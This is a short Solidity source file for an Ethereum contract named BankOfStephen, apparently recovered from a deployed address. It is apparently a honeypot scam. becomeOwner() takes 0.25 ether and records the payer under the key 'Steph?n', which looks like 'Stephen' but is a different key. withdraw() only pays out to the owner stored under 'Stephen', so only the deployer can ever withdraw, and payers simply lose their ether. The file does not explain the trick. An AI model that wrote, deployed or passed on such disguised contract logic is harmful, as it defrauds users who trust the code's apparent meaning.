/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract BankOfStephen at 0xf5615138a7f2605e382375fa33ab368661e017ff
*/
pragma solidity ^0.4.24;

contract BankOfStephen{

mapping(bytes32 => address) private owner;

constructor() public{
    owner['Stephen'] = msg.sender;
}

function becomeOwner() public payable{
    require(msg.value >= 0.25 ether);        
    owner['Steph?n'] = msg.sender; 
}

function withdraw() public{
    require(owner['Stephen'] == msg.sender);
    msg.sender.transfer(address(this).balance);
}

function() public payable {}

}